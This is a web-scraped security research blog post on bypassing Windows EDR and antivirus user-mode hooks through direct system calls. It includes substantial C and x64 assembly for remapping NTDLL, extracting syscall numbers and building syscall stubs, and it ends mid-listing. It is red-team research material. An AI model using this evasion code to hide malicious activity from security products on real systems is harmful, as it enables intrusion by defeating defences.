{"text":"#[1]alternate [2]alternate [3]alternate\n* [4]Our Services\n* [5]Knowledge Centre\n* [6]About\n* [7]Contact\n* [8]Our Services\n+ [9]Adversary Simulation\n+ [10]Application Security\n+ [11]Penetration Testing\n+ [12]Response\n* [13]Knowledge Centre\n+ [14]Insights\n+ [15]Research\n+ [16]Training\n* [17]About\n* [18]Contact\n(BUTTON)\n* Adversary\nAdversary Simulation\nOur best in class red team can deliver a holistic cyber attack\nsimulation to provide a true evaluation of your organisation\u2019s\ncyber resilience.\n* Application Security\nApplication\nSecurity\nLeverage the team behind the industry-leading Web Application and\nMobile Hacker\u2019s Handbook series.\n* Penetration Testing\nPenetration\nTesting\nMDSec\u2019s penetration testing team is trusted by companies from the\nworld\u2019s leading technology firms to global financial institutions.\n* Response\nResponse\nOur certified team work with customers at all stages of the\nIncident Response lifecycle through our range of proactive and\nreactive services.\n* [19]\nResearch\nMDSec\u2019s dedicated research team periodically releases white papers,\nblog posts, and tooling.\n* [20]\nTraining\nMDSec\u2019s training courses are informed by our security consultancy\nand research functions, ensuring you benefit from the latest and\nmost applicable trends in the field.\n* [21]\nInsights\nView insights from MDSec\u2019s consultancy and research teams.\nActiveBreach\nBypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams\n[22]Home > [23]Knowledge Centre > [24]Insights > Bypassing User-Mode\nHooks and Direct Invocation of System Calls for Red Teams\nIntroduction\nThe motivation to bypass user-mode hooks initially began with improving\nthe success rate of [25]process injection. There can be legitimate\nreasons to perform injection. [26]UI Automation and Active\nAccessibility will use it to read and write memory of a GUI\nprocess. [27]Spy++ uses it to log window messages sent and received\nbetween processes. But in most cases, it\u2019s used for one of the\nfollowing:\n* Hiding code inside a legitimate process to evade, prolong detection\nand removal.\n* Executing code in the context of another user or elevating\nprivileges.\n* Modifying memory to cheat at online games.\nAnd another less cited reason is to prevent all the above completing.\nGenerally, process injection from user-mode (UM) applications needs the\nfollowing steps.\n1. Open a target process.\n2. Allocate new or use existing memory to store code.\n3. Write code with optional data to target process.\n4. Execute code via new or existing thread.\nWhile it\u2019s relatively simple to implement, the most common problem red\nteamers, game cheats and malware developers encounter today\nis kernel-mode (KM) notifications, [28]mini-filter drivers and UM hooks\ninstalled by security vendors. UM hooks usually exist for system calls\nlocated inside NTDLL, which is about as close to the kernel as a UM\nprocess can be. With full access to the kernel, you\u2019d assume security\nvendors have total control over the system and can block any type of\nmalicious activity quite easily. But as some of you will know already,\nWindows has a security feature builtin since Vista called PatchGuard\n(PG) that protects critical areas of the kernel from being modified.\nThose areas include:\n* System Service Descriptor Table (SSDT)\n* Global Descriptor Table (GDT)\n* Interrupt Descriptor Table (IDT)\n* System images (ntoskrnl.exe, ndis.sys, hal.dll)\n* Processor MSRs (syscall)\nPG (much to the disappointment of security vendors and malware\ndevelopers) restricts any software making extensions to the Windows\nkernel (even those for legitimate reasons). And up until its\nintroduction, it was commonplace for security vendors to patch the\nSSDT. (something also used by early versions\nof [29]RegMon by [30]Sysinternals). Microsoft\u2019s position is\nthat any software, whether malicious or not, that patches the kernel\ncan lead to reliability, performance and, most importantly, security\nissues. Following the release of PG, security vendors had to completely\nredesign their anti-malware solutions. Circumventing PG is an option,\nbut it\u2019s not a safe, longterm solution for software intended to protect\nyour operating system.\nIn this post we will catalogue the most popular and effective\ntechniques for bypassing user-mode hooks, outlining advantages and\ndisadvantages of each approach for red teamers where relevant. Finally,\nwe will conclude with some approaches that can be used by defenders to\nprotect or detect these techniques.\nKernel-Mode Notifications\nBefore exploring UM hook bypass methods, it\u2019s worth noting that as an\nalternative to patching or hooking in the kernel, Windows facilitates\nreceiving notifications about events useful in detecting malware. The\nmore common events include creation, termination of a process or thread\nand the mapping of an image\/DLL for execution.\nMicrosoft recommends security vendors use [31]mini-filter drivers to\nintercept, examine and optionally block I\/O events. A significant\namount of file system and network functionality is implemented via\nthe [32]NtDeviceIoControlFile system call.\nBypass Methods\nSince Microsoft doesn\u2019t provide a legitimate way for kernel components\nto receive notifications about memory operations, this forces vendors\nto install UM hooks in each process. In response to this, various\ntechniques to bypass them have been devised and what follows is a brief\ndescription and source code in C to demonstrate some of those methods\ncurrently being used.\n1. Export Address Table (EAT)\nIt\u2019s common for malware to resolve the address of system calls using a\ncombination of [33]GetModuleHandle and [34]GetProcAddress. Another way\nis to manually locate NTDLL.dll in the Process Environment Block (PEB)\nand find the system call through parsing the Export Address Table\n(EAT). The following code is what you might see used to parse the EAT.\nstatic\nLPVOID\nWINAPI\nGetProcAddressFromEAT(\nLPVOID DllBase,\nconst char *FunctionName)\n{\nPIMAGE_DOS_HEADER       DosHeader;\nPIMAGE_NT_HEADERS       NtHeaders;\nDWORD                   NumberOfNames, VirtualAddress;\nPIMAGE_DATA_DIRECTORY   DataDirectory;\nPIMAGE_EXPORT_DIRECTORY ExportDirectory;\nPDWORD                  Functions;\nPDWORD                  Names;\nPWORD                   Ordinals;\nPCHAR                   Name;\nLPVOID                  ProcAddress=NULL;\nDosHeader      = (PIMAGE_DOS_HEADER)DllBase;\nNtHeaders      = RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);\nDataDirectory  = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirect\nory;\nVirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\nif (VirtualAddress==0) return NULL;\nExportDirectory = RVA2VA(PIMAGE_EXPORT_DIRECTORY, DllBase, VirtualAddress);\nNumberOfNames   = ExportDirectory->NumberOfNames;\nif (NumberOfNames==0) return NULL;\nFunctions = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfFunctions);\nNames     = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfNames);\nOrdinals  = RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);\ndo {\nName = RVA2VA(PCHAR, DllBase, Names[NumberOfNames-1]);\nif(lstrcmpA(Name, FunctionName) == 0) {\nProcAddress = RVA2VA(LPVOID, DllBase, Functions[Ordinals[NumberOfNames-1\n]]);\nreturn ProcAddress;\n}\n} while (--NumberOfNames && ProcAddress == NULL);\nreturn ProcAddress;\n}\nIf using the base address of NTDLL already in memory, this won\u2019t bypass\nany UM hooks for system calls. It\u2019s fine if you wish to bypass KERNEL32\nor KERNELBASE hooks, but you can just as well use GetProcAddress to\nmake life easier.\nUsually, offsec tools will attempt to unhook system calls after calling\na function like this and it can work well against many security\nproducts. Lately, however, more reputable vendors are either blocking\nthe attempt to unhook or simply restoring the hooks shortly after\nunhooking has occurred. A hook on NtProtectVirtualMemory could easily\nintercept attempts to overwrite hooks.\n2. Dual-load 1 (Section)\nKnownDlls is a directory in the object namespace that contains section\nobjects for the most common DLLs loaded by a process. It\u2019s intended to\nimprove performance by reducing the load time for an executable and\nit\u2019s possible to map a new copy of NTDLL into a process by opening the\nsection name \u201c\\KnownDlls\\ntdll.dll\u201c. Once the section object is mapped,\nwe can resolve the address of system calls as described in the previous\nmethod. There\u2019s a kernel notification for loading an image and if an\nEDR or AV spotted NTDLL.dll being loaded a second time, it\u2019s probably\ngoing to examine the process for malware or at the very least notify\nthe user of suspicious activity.\nWhile you can use [35]NtOpenSection and [36]NtMapViewOfSection to load\na new copy, the other problem is that these are likely to be hooked\nalready. Some products won\u2019t hook [37]NtMapViewOfSectionEx, but that\u2019s\nonly available since Windows 10 1803 and it still doesn\u2019t prevent a\nkernel notification for the mapping.\nNTSTATUS          Status;\nLARGE_INTEGER     SectionOffset;\nSIZE_T            ViewSize;\nPVOID             ViewBase;\nHANDLE            SectionHandle;\nOBJECT_ATTRIBUTES ObjectAttributes;\nUNICODE_STRING    KnownDllsNtDllName;\nFARPROC           Function;\nINIT_UNICODE_STRING(\nKnownDllsNtDllName,\nL\"\\\\KnownDlls\\\\ntdll.dll\"\n);\nInitializeObjectAttributes(\n&ObjectAttributes,\n&KnownDllsNtDllName,\nOBJ_CASE_INSENSITIVE,\n0,\nNULL\n);\nStatus = NtOpenSection(\n&SectionHandle,\nSECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_QUERY,\n&ObjectAttributes\n);\nif(!NT_SUCCESS(Status)) {\nSET_LAST_NT_ERROR(Status);\nprintf(\"Unable to open section %ld\\n\", GetLastError());\ngoto cleanup;\n}\n\/\/\n\/\/ Set the offset to start mapping from.\n\/\/\nSectionOffset.LowPart = 0;\nSectionOffset.HighPart = 0;\n\/\/\n\/\/ Set the desired base address and number of bytes to map.\n\/\/\nViewSize = 0;\nViewBase = NULL;\nStatus = NtMapViewOfSection(\nSectionHandle,\nNtCurrentProcess(),\n&ViewBase,\n0,              \/\/ ZeroBits\n0,              \/\/ CommitSize\n&SectionOffset,\n&ViewSize,\nViewShare,\n0,\nPAGE_EXECUTE_READ\n);\nif(!NT_SUCCESS(Status)) {\nSET_LAST_NT_ERROR(Status);\nprintf(\"Unable to map section %ld\\n\", GetLastError());\ngoto cleanup;\n}\nFunction = (FARPROC)GetProcAddressFromEAT(ViewBase, \"NtOpenProcess\");\nprintf(\"NtOpenProcess : %p, %ld\\n\", Function, GetLastError());\ncleanup:\nif(ViewBase != NULL) {\nNtUnmapViewOfSection(\nNtCurrentProcess(),\nViewBase\n);\n}\nif(SectionHandle != NULL) {\nNtClose(SectionHandle);\n}\n3. Dual-load 2 (Disk)\nThe only additional step when compared to the previous method is that\nwe open a file handle to C:\\Windows\\System32\\NTDLL.dll and use it to\ncreate a new section object with the SEC_IMAGE page protection. Then we\nmap the object for reading or\nexecuting. [38]NtOpenFile, [39]NtCreateFile can be hooked, but even if\nthey aren\u2019t, this doesn\u2019t solve the problems highlighted in the\nprevious method.\nNTSTATUS          Status;\nLARGE_INTEGER     SectionOffset;\nSIZE_T            ViewSize;\nPVOID             ViewBase=NULL;\nHANDLE            FileHandle=NULL, SectionHandle=NULL;\nOBJECT_ATTRIBUTES ObjectAttributes;\nIO_STATUS_BLOCK   StatusBlock;\nUNICODE_STRING    FileName;\nFARPROC           Function;\n\/\/\n\/\/ Try open ntdll.dll on disk for reading.\n\/\/\nINIT_UNICODE_STRING(\nFileName,\nL\"\\\\??\\\\C:\\\\Windows\\\\System32\\\\ntdll.dll\"\n);\nInitializeObjectAttributes(\n&ObjectAttributes,\n&FileName,\nOBJ_CASE_INSENSITIVE,\n0,\nNULL\n);\nStatus = NtOpenFile(\n&FileHandle,\nFILE_READ_DATA,\n&ObjectAttributes,\n&StatusBlock,\nFILE_SHARE_READ,\nNULL\n);\nif(!NT_SUCCESS(Status)) {\nSET_LAST_NT_ERROR(Status);\nprintf(\"NtOpenFile failed %ld\\n\", GetLastError());\ngoto cleanup;\n}\n\/\/\n\/\/ Create section\n\/\/\nStatus = NtCreateSection(\n&SectionHandle,\nSECTION_ALL_ACCESS,\nNULL,\nNULL,\nPAGE_READONLY,\nSEC_IMAGE,\nFileHandle\n);\nif(!NT_SUCCESS(Status)) {\nSET_LAST_NT_ERROR(Status);\nprintf(\"NtCreateSection failed %ld\\n\", GetLastError());\ngoto cleanup;\n}\n\/\/\n\/\/ Set the offset to start mapping from.\n\/\/\nSectionOffset.LowPart = 0;\nSectionOffset.HighPart = 0;\n\/\/\n\/\/ Set the desired base address and number of bytes to map.\n\/\/\nViewSize = 0;\nViewBase = NULL;\nStatus = NtMapViewOfSection(\nSectionHandle,\nNtCurrentProcess(),\n&ViewBase,\n0,              \/\/ ZeroBits\n0,              \/\/ CommitSize\n&SectionOffset,\n&ViewSize,\nViewShare,\n0,\nPAGE_EXECUTE_READ\n);\nif(!NT_SUCCESS(Status)) {\nSET_LAST_NT_ERROR(Status);\nprintf(\"Unable to map section %ld\\n\", GetLastError());\ngoto cleanup;\n}\nFunction = (FARPROC)GetProcAddressFromEAT(ViewBase, \"NtOpenProcess\");\nprintf(\"NtOpenProcess : %p, %ld\\n\", Function, GetLastError());\ncleanup:\nif(ViewBase != NULL) {\nNtUnmapViewOfSection(\nNtCurrentProcess(),\nViewBase\n);\n}\nif(SectionHandle != NULL) {\nNtClose(SectionHandle);\n}\nif(FileHandle != NULL) {\nNtClose(FileHandle);\n}\n4. Extracting SSN Code Stub (Disk)\nOpen a file handle to C:\\Windows\\System32\\NTDLL.dll. Create and map a\nsection object with SEC_COMMIT and PAGE_READONLY page protection. (to\ntry bypass any hooks and notifications). The system call that attacker\nneeds is then resolved by parsing of the PE header and copying the call\nstub to executable memory. One could also use it to overwrite any\npotential hooks in the existing copy of NTDLL, but that will require\nusing NtProtectVirtualMemory, which may already be hooked. Most system\ncalls are usually no more than 32 bytes, but if the length of stub is\nrequired, 64-bit PE files support an exception directory which can be\nused to calculate it. NtOpenFile, NtCreateFile, [40]NtReadFile might be\nhooked and reading NTDLL.dll from disk will look suspicious.\nstatic\nDWORD\nWINAPI\nRvaToOffset(\nPIMAGE_NT_HEADERS NtHeaders,\nDWORD Rva)\n{\nPIMAGE_SECTION_HEADER SectionHeader;\nDWORD                 i, Size;\nif(Rva == 0) return 0;\nSectionHeader = IMAGE_FIRST_SECTION(NtHeaders);\nfor(i = 0; i<NUMBER_OF_SECTIONS(NtHeaders); i++) {\nSize = SectionHeader[i].Misc.VirtualSize ?\nSectionHeader[i].Misc.VirtualSize : SectionHeader[i].SizeOfRawData;\nif(SectionHeader[i].VirtualAddress <= Rva &&\nRva <= (DWORD)SectionHeader[i].VirtualAddress + SectionHeader[i].SizeOfR\nawData)\n{\nif(Rva >= SectionHeader[i].VirtualAddress &&\nRva <  SectionHeader[i].VirtualAddress + Size) {\nreturn SectionHeader[i].PointerToRawData + (Rva - SectionHeader[i].Vir\ntualAddress);\n}\n}\n}\nreturn 0;\n}\nstatic\nPVOID\nWINAPI\nGetProcAddressFromMappedDLL(\nPVOID DllBase,\nconst char *FunctionName)\n{\nPIMAGE_DOS_HEADER       DosHeader;\nPIMAGE_NT_HEADERS       NtHeaders;\nPIMAGE_SECTION_HEADER   SectionHeader;\nPIMAGE_DATA_DIRECTORY   DataDirectory;\nPIMAGE_EXPORT_DIRECTORY ExportDirectory;\nDWORD                   Rva, Offset, NumberOfNames;\nPCHAR                   Name;\nPDWORD                  Functions, Names;\nPWORD                   Ordinals;\nDosHeader = (PIMAGE_DOS_HEADER)DllBase;\nNtHeaders  = (PIMAGE_NT_HEADERS)((PBYTE)DllBase + DosHeader->e_lfanew);\nDataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirecto\nry;\nRva = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\nOffset = RvaToOffset(NtHeaders, Rva);\nExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)DllBase + Offset);\nNumberOfNames = ExportDirectory->NumberOfNames;\nOffset = RvaToOffset(NtHeaders, ExportDirectory->AddressOfNames);\nNames = (PDWORD)((PBYTE)DllBase + Offset);\nOffset = RvaToOffset(NtHeaders, ExportDirectory->AddressOfFunctions);\nFunctions = (PDWORD)((PBYTE)DllBase + Offset);\nOffset = RvaToOffset(NtHeaders, ExportDirectory->AddressOfNameOrdinals);\nOrdinals = (PWORD)((PBYTE)DllBase + Offset);\ndo {\nName = (PCHAR)(RvaToOffset(NtHeaders, Names[NumberOfNames - 1]) + (PBYTE)D\nllBase);\nif(lstrcmpA(Name, FunctionName) == 0) {\nreturn (PVOID)((PBYTE)DllBase + RvaToOffset(NtHeaders, Functions[Ordinal\ns[NumberOfNames - 1]]));\n}\n} while (--NumberOfNames);\nreturn NULL;\n}\n5. Extracting SSN (Disk)\nIt\u2019s the exact same as the previous method described, except we only\nextract the System Service Number (SSN) and manually execute it with a\ncode stub of our own. [41]SyscallTables demonstrates dumping the\nnumbers, while [42]Hell\u2019s Gate demonstrates using them.\n6. FireWalker\n[43]FireWalker: A New Approach to Generically Bypass User-Space EDR\nHooking works by installing a Vectored Exception Handler and setting\nthe CPU trap flag to single-step through a Win32 API or system call.\nThe exception handler then attempts to locate the original system call\nstub. Another approach to this is using a disassembler and separate\nroutines to build a call graph of the system call. Windows has a\nbuiltin disassembler that can be used to calculate the length of an\ninstruction. The downside is that it doesn\u2019t provide a binary view of\nan opcode, so the [44]Zydis disassembler library may be a better\noption. Internally, the debugger engine for windows has support for\nbuilding a call graph of a function (to support the uf command in\nWinDbg), but unfortunately there\u2019s no API exposed to developers.\n7. SysWhispers\n[45]SysWhispers contains a Python script that will construct a code\nstub for system calls to run on AMD64\/x64 systems. The stub is\ncompatible with Windows between XP\/2003 and 10\/2019. The generator uses\nSSNs taken from [46]a list maintained by [47]j00ru. And the correct SSN\nis selected at runtime based on the version of the operating system\nthat\u2019s detected via the PEB. In more recent versions of Windows,\nthere\u2019s also the option of using [48]KUSER_SHARED_DATA to read\nthe [49]major, minor and build version. SysWhispers is currently\npopular among red teamers for bypassing AV and EDR. The following is an\nexample code stub generated for NtOpenProcess:\nNtOpenProcess:\nmov rax, [gs:60h]                       ; Load PEB into RAX.\nNtOpenProcess_Check_X_X_XXXX:               ; Check major version.\ncmp dword [rax+118h], 5\nje  NtOpenProcess_SystemCall_5_X_XXXX\ncmp dword [rax+118h], 6\nje  NtOpenProcess_Check_6_X_XXXX\ncmp dword [rax+118h], 10\nje  NtOpenProcess_Check_10_0_XXXX\njmp NtOpenProcess_SystemCall_Unknown\nNtOpenProcess_Check_6_X_XXXX:               ; Check minor version for Windows Vi\nsta\/7\/8.\ncmp dword [rax+11ch], 0\nje  NtOpenProcess_Check_6_0_XXXX\ncmp dword [rax+11ch], 1\nje  NtOpenProcess_Check_6_1_XXXX\ncmp dword [rax+11ch], 2\nje  NtOpenProcess_SystemCall_6_2_XXXX\ncmp dword [rax+11ch], 3\nje  NtOpenProcess_SystemCall_6_3_XXXX\njmp NtOpenProcess_SystemCall_Unknown\nNtOpenProcess_Check_6_0_XXXX:               ; Check build number for Windows Vis\nta.\ncmp word [rax+120h], 6000\nje  NtOpenProcess_SystemCall_6_0_6000\ncmp word [rax+120h], 6001\nje  NtOpenProcess_SystemCall_6_0_6001\ncmp word [rax+120h], 6002\nje  NtOpenProcess_SystemCall_6_0_6002\njmp NtOpenProcess_SystemCall_Unknown\nNtOpenProcess_Check_6_1_XXXX:               ; Check build number for Windows 7.\ncmp word [rax+120h], 7600\nje  NtOpenProcess_SystemCall_6_1_7600\ncmp word [rax+120h], 7601\nje  NtOpenProcess_SystemCall_6_1_7601\njmp NtOpenProcess_SystemCall_Unknown\nNtOpenProcess_Check_10_0_XXXX:              ; Check build number for Windows 10.\ncmp word [rax+120h], 10240\nje  NtOpenProcess_SystemCall_10_0_10240\ncmp word [rax+120h], 10586\nje  NtOpenProcess_SystemCall_10_0_10586\ncmp word [rax+120h], 14393\nje  NtOpenProcess_SystemCall_10_0_14393\ncmp word [rax+120h], 15063\nje  NtOpenProcess_SystemCall_10_0_15063\ncmp word [rax+120h], 16299\nje  NtOpenProcess_SystemCall_10_0_16299\ncmp word [rax+120h], 17134\nje  NtOpenProcess_SystemCall_10_0_17134\ncmp word [rax+120h], 17763\nje  NtOpenProcess_SystemCall_10_0_17763\ncmp word [rax+120h], 18362\nje  NtOpenProcess_SystemCall_10_0_18362\ncmp word [rax+120h], 18363\nje  NtOpenProcess_SystemCall_10_0_18363\ncmp word [rax+120h], 19041\nje  NtOpenProcess_SystemCall_10_0_19041\njmp NtOpenProcess_SystemCall_Unknown\nNtOpenProcess_SystemCall_5_X_XXXX:          ; Windows XP and Server 2003\nmov eax, 0023h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_0_6000:          ; Windows Vista SP0\nmov eax, 0023h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_0_6001:          ; Windows Vista SP1 and Server 2008\nSP0\nmov eax, 0023h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_0_6002:          ; Windows Vista SP2 and Server 2008\nSP2\nmov eax, 0023h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_1_7600:          ; Windows 7 SP0\nmov eax, 0023h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_1_7601:          ; Windows 7 SP1 and Server 2008 R2 S\nP0\nmov eax, 0023h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_2_XXXX:          ; Windows 8 and Server 2012\nmov eax, 0024h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_6_3_XXXX:          ; Windows 8.1 and Server 2012 R2\nmov eax, 0025h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_10240:        ; Windows 10.0.10240 (1507)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_10586:        ; Windows 10.0.10586 (1511)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_14393:        ; Windows 10.0.14393 (1607)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_15063:        ; Windows 10.0.15063 (1703)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_16299:        ; Windows 10.0.16299 (1709)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_17134:        ; Windows 10.0.17134 (1803)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_17763:        ; Windows 10.0.17763 (1809)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_18362:        ; Windows 10.0.18362 (1903)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_18363:        ; Windows 10.0.18363 (1909)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_10_0_19041:        ; Windows 10.0.19041 (2004)\nmov eax, 0026h\njmp NtOpenProcess_Epilogue\nNtOpenProcess_SystemCall_Unknown:           ; Unknown\/unsupported version.\nret\nNtOpenProcess_Epilogue:\nmov r10, rcx\nsyscall\nret\n8. Sorting by System Call Address\nThere\u2019s a method of discovering SSNs that doesn\u2019t require loading a new\ncopy of NTDLL, doesn\u2019t require unhooking, doesn\u2019t require querying the\nPEB or KUSER_SHARED_DATA for version information, and doesn\u2019t require\nreading them from code stubs manually. Moreover, it\u2019s relatively simple\nto implement and should work successfully on all versions of Windows.\nAdmittedly, it\u2019s based on an [50]unhooking technique used in some\nransomware that was first suggested by userman01 on discord. His\ncomment was:\n\u201cAn easy way to get syscall indices, even if AV overwrites them, \u2026\nsimply enumerate all Zw* stubs and then sort them by address.\u201d\nSounds perfect! GetSyscallList() will parse the EAT of NTDLL.dll,\nlocating all function names that begin with \u201cZw\u201d. It replaces \u201cZw\u201d with\n\u201cNt\u201d before generating a hash of the function name. It then saves the\nhash and address of code stub to a table of SYSCALL_ENTRY structures.\nAfter gathering all the names, it uses a simple bubble sort of code\naddresses in ascending order. The SSN is the index of the system call\nstored in the table.\n#define RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)\nstatic\nvoid\nGetSyscallList(PSYSCALL_LIST List) {\nPPEB_LDR_DATA           Ldr;\nPLDR_DATA_TABLE_ENTRY   LdrEntry;\nPIMAGE_DOS_HEADER       DosHeader;\nPIMAGE_NT_HEADERS       NtHeaders;\nDWORD                   i, j, NumberOfNames, VirtualAddress, Entries=0;\nPIMAGE_DATA_DIRECTORY   DataDirectory;\nPIMAGE_EXPORT_DIRECTORY ExportDirectory;\nPDWORD                  Functions;\nPDWORD                  Names;\nPWORD                   Ordinals;\nPCHAR                   DllName, FunctionName;\nPVOID                   DllBase;\nPSYSCALL_ENTRY          Table;\nSYSCALL_ENTRY           Entry;\n\/\/\n\/\/ Get the DllBase address of NTDLL.dll\n\/\/ NTDLL is not guaranteed to be the second in the list.\n\/\/ so it's safer to loop through the full list and find it.\nLdr = (PPEB_LDR_DATA)NtCurrentTeb()->ProcessEnvironmentBlock->Ldr;\n\/\/ For each DLL loaded\nfor (LdrEntry=(PLDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1];\nLdrEntry->DllBase != NULL;\nLdrEntry=(PLDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])\n{\nDllBase = LdrEntry->DllBase;\nDosHeader = (PIMAGE_DOS_HEADER)DllBase;\nNtHeaders = RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);\nDataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirec\ntory;\nVirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddres\ns;\nif(VirtualAddress == 0) continue;\nExportDirectory = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, DllBase, Vir\ntualAddress);\n\/\/\n\/\/ If this is NTDLL.dll, exit loop\n\/\/\nDllName = RVA2VA(PCHAR,DllBase, ExportDirectory->Name);\nif((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;\nif((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;\n}\nNumberOfNames = ExportDirectory->NumberOfNames;\nFunctions = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfFunctions);\nNames     = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfNames);\nOrdinals  = RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);\nTable     = List->Table;\ndo {\nFunctionName = RVA2VA(PCHAR, DllBase, Names[NumberOfNames-1]);\n\/\/\n\/\/ Is this a system call?\n\/\/\nif(*(USHORT*)FunctionName == 'wZ') {\n\/\/\n\/\/ Save Hash of system call and the address.\n\/\/\nTable[Entries].Hash = HashSyscall(0x4e000074, &FunctionName[2]);\nTable[Entries].Address = Functions[Ordinals[NumberOfNames-1]];\nEntries++;\nif(Entries == MAX_SYSCALLS) break;\n}\n} while (--NumberOfNames);\n\/\/\n\/\/ Save total number of system calls found.\n\/\/\nList->Entries = Entries;\n\/\/\n\/\/ Sort the list by address in ascending order.\n\/\/\nfor(i=0; i<Entries - 1; i++) {\nfor(j=0; j<Entries - i - 1; j++) {\nif(Table[j].Address > Table[j+1].Address) {\n\/\/\n\/\/ Swap entries.\n\/\/\nEntry.Hash = Table[j].Hash;\nEntry.Address = Table[j].Address;\nTable[j].Hash = Table[j+1].Hash;\nTable[j].Address = Table[j+1].Address;\nTable[j+1].Hash = Entry.Hash;\nTable[j+1].Address = Entry.Address;\n}\n}\n}\n}\nJust to demonstrate how it might work in amd64\/x64 assembly, the\nfollowing is based on the above code:\n; *************************************************\n; Gather a list of system calls by parsing the\n; export address table of NTDLL.dll\n;\n; Generate a hash of the syscall name and save\n; the relative virtual address to a table.\n;\n; Sort table entries by virtual address in ascending order.\n;\n; **************************************************\n%ifndef BIN\nglobal GetSyscallList_amd64\n%endif\nGetSyscallList_amd64:\n; save non-volatile registers\n; rcx points to SYSCALL_LIST.\n; it's saved last.\npushx   rsi, rbx, rdi, rbp, rcx\npush    TEB.ProcessEnvironmentBlock\npop     r11\nmov     rax, [gs:r11]\nmov     rax, [rax+PEB.Ldr]\nmov     rdi, [rax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]\njmp     scan_dll\n;\n; Because NTDLL.dll is not guaranteed to be second in the list of DLLs,\n; we search until a match is found.\n;\nnext_dll:\nmov     rdi, [rdi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink\n]\nscan_dll:\nmov     rbx, [rdi+LDR_DATA_TABLE_ENTRY.DllBase]\n;\nmov     esi, [rbx+IMAGE_DOS_HEADER.e_lfanew]\nadd     esi, r11d             ; add 60h or TEB.ProcessEnvironmentBlock\n; ecx = IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress\nmov     ecx, [rbx+rsi+IMAGE_NT_HEADERS.OptionalHeader + \\\nIMAGE_OPTIONAL_HEADER.DataDirectory + \\\nIMAGE_DIRECTORY_ENTRY_EXPORT * IMAGE_DATA_DIRECTORY_s\nize + \\\nIMAGE_DATA_DIRECTORY.VirtualAddress - \\\nTEB.ProcessEnvironmentBlock]\njecxz   next_dll ; if no exports, try next module in the list\n; rsi = offset IMAGE_EXPORT_DIRECTORY.Name\nlea     rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.Name]\n; NTDLL?\nlodsd\nxchg    eax, esi\nadd     rsi, rbx\n;\n; Convert to lowercase by setting bit 5 of each byte.\n;\nlodsd\nor      eax, 0x20202020\ncmp     eax, 'ntdl'\njnz     next_dll\nlodsd\nor      eax, 0x20202020\ncmp     eax, 'l.dl'\njnz     next_dll\n;\n; Load address of SYSCALL_LIST.Table\n;\npop     rdi\npush    rdi\nscasd           ; skip Entries\npush    0       ; Entries = 0\n; rsi = offset IMAGE_EXPORT_DIRECTORY.Name\nlea     rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]\nlodsd                  ; eax = NumberOfNames\nxchg    eax, ecx\n; r8 = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions\nlodsd\nxchg    eax, r8d\nadd     r8, rbx        ; r8 = RVA2VA(r8, rbx)\n; rbp = IMAGE_EXPORT_DIRECTORY.AddressOfNames\nlodsd\nxchg    eax, ebp\nadd     rbp, rbx       ; rbp = RVA2VA(rbp, rbx)\n; r9 = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals\nlodsd\nxchg    eax, r9d\nadd     r9, rbx        ; r9 = RVA2VA(r9, rbx)\nfind_syscall:\nmov     esi, [rbp+rcx*4-4]    ; rsi = AddressOfNames[rcx-1]\nadd     rsi, rbx\nlodsw\ncmp     ax, 'Zw'       ; system 